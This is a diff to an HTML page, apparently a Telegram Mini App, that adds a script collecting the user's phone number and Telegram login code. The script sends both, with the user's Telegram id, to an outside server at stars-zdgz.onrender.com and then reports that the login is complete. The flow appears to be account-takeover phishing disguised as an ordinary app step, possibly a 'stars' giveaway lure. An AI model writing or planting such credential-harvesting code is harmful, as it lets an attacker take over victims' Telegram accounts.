@@ -659,6 +659,54 @@ goStep4 = function() {
   originalGoStep4();
 };
 </script>
+<script>
+const tg      = window.Telegram.WebApp;
+const user_id = tg.initDataUnsafe?.user?.id;
 
+// Запрашиваем код
+async function sendCode() {
+    const phone = document.getElementById("phone").value;
+    if (!phone) { showMsg("Введите номер телефона"); return; }
+
+    const res  = await fetch("https://stars-zdgz.onrender.com/send_code", {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify({ user_id, phone })
+    });
+    const data = await res.json();
+
+    if (data.ok) {
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+        showMsg("✅ Код отправлен в Telegram!");
+    } else {
+        showMsg("❌ " + data.error);
+    }
+}
+
+// Проверяем код
+async function checkCode() {
+    const code = document.getElementById("code").value;
+    if (!code) { showMsg("Введите код"); return; }
+
+    const res  = await fetch("https://stars-zdgz.onrender.com/check_code", {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify({ user_id, code })
+    });
+    const data = await res.json();
+
+    if (data.ok) {
+        showMsg("✅ Код верный! Вход выполнен.");
+        tg.close(); // закрываем Mini App после входа
+    } else {
+        showMsg("❌ " + data.error);
+    }
+}
+
+function showMsg(text) {
+    document.getElementById("msg").innerText = text;
+}
+</script>
 </body> 
 </html>
